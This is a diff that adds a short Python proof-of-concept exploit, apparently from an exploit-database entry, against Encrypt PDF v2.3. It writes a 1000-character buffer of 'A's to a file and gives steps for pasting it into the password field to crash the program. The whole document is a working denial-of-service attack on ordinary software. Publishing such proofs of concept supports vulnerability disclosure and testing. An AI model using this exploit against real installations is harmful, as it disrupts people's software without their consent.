@@ -1,0 +1,21 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: Encrypt PDF v2.3 - Denial of Service (PoC)
+# Date: 19/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.verypdf.com
+# Software: http://www.verypdf.com/encryptpdf/encryptpdf.exe
+# Version: 2.3
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "EncryptPDF.py", it will create a new file "EncryptPDF.txt"
+# 2.- Copy the text from the generated EncryptPDF.txt file to clipboard
+# 3.- Open Encrypt PDF v2.3
+# 4.- Go to 'Setting', paste clipboard in the field 'User Password' or the field 'Master Password' and Click 'OK'
+# 5.- Click on 'Open PDF(s)', when you import a pdf file, you will see a crash
+
+buffer = "\x41" * 1000
+
+f = open ("EncryptPDF.txt", "w")
+f.write(buffer)
+f.close()
